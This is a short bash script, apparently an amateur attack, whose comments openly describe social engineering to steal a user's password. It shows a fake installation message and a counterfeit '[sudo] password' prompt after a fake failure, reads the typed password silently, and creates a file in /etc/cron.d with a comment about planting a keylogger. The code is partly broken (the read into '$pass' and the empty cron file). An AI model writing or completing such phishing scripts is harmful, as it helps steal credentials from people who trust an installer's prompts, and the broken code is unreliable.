#!/bin/bash
# use social engineering - they trust that its their password
echo "For installation please enter your password"
# put the keylogger in the cronjob
sudo touch /etc/cron.d/test.sh
# Make it look like they failed so i can steal their password
echo "Sorry, try again."
name=$(whoami)
echo -n "[sudo] password for $name: "
read -s $pass
# have now stolen the password
echo


